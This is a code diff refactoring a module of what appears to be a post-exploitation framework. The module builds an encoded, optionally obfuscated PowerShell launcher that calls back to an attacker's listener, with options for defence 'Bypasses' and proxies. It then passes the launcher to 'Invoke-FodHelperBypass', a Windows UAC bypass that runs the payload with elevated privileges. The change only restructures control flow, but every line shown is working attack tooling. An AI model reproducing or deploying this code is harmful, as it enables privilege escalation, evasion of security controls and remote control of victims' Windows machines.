@@ -33,29 +33,28 @@ class Module:
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
             return handle_error_message("[!] Invalid listener: " + listener_name)
-        else:
-            # generate the PowerShell one-liner with all of the proper options set
-            launcher = main_menu.stagergenv2.generate_launcher(
-                listener_name=listener_name,
-                language="powershell",
-                encode=True,
-                obfuscate=launcher_obfuscate,
-                obfuscation_command=launcher_obfuscate_command,
-                user_agent=user_agent,
-                proxy=proxy,
-                proxy_creds=proxy_creds,
-                bypasses=params["Bypasses"],
-            )
 
-            enc_script = launcher.split(" ")[-1]
-            if launcher == "":
-                return handle_error_message("[!] Error in launcher generation.")
-            else:
-                script_end = f'Invoke-FodHelperBypass -Command "{enc_script}"'
-                script = main_menu.modulesv2.finalize_module(
-                    script=script,
-                    script_end=script_end,
-                    obfuscate=obfuscate,
-                    obfuscation_command=obfuscation_command,
-                )
-                return script
+        # generate the PowerShell one-liner with all of the proper options set
+        launcher = main_menu.stagergenv2.generate_launcher(
+            listener_name=listener_name,
+            language="powershell",
+            encode=True,
+            obfuscate=launcher_obfuscate,
+            obfuscation_command=launcher_obfuscate_command,
+            user_agent=user_agent,
+            proxy=proxy,
+            proxy_creds=proxy_creds,
+            bypasses=params["Bypasses"],
+        )
+
+        enc_script = launcher.split(" ")[-1]
+        if launcher == "":
+            return handle_error_message("[!] Error in launcher generation.")
+
+        script_end = f'Invoke-FodHelperBypass -Command "{enc_script}"'
+        return main_menu.modulesv2.finalize_module(
+            script=script,
+            script_end=script_end,
+            obfuscate=obfuscate,
+            obfuscation_command=obfuscation_command,
+        )
